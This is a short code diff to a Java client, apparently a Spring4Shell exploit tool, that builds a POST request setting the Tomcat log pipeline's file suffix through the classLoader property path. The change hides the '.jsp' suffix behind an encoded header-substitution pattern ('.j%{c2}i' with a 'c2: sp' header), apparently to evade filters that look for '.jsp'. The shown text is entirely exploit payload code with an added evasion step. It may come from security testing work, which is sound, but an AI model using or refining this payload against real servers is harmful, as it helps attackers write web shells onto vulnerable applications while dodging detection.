@@ -37,7 +37,8 @@ public class Spring4ShellClient {
   private static RequestEntity<String> newPayloadEntity(URI baseUri) {
     HttpHeaders httpHeaders = new HttpHeaders();
     httpHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);
-    String payload = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp";
+    httpHeaders.add("c2", "sp");
+    String payload = "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.j%25%7Bc2%7Di"; // .j%{c2}i -> .jsp
     return new RequestEntity<>(payload, httpHeaders, HttpMethod.POST, baseUri);
   }
 
